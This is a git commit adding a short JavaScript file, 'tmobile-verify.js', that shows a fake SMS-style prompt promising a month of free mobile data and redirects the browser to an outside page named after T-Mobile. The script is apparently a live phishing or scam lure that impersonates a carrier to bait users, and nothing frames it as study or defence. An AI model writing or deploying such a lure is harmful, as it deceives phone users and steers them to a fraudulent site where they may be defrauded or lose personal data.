870ebd82c7aa62a05811fada3ea7d8de2ff627b9
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-11 06:39:05 +0100

    Create tmobile-verify.js

---
+++ tmobile-verify.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE NOW'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 1 Month Free Data, click OK to Activate now','ACTIVATE NOW');
+if (password != 'ACTIVATE NOW') {
+location.href='https://gbamz.com/t-mobile-pl.html';
+}
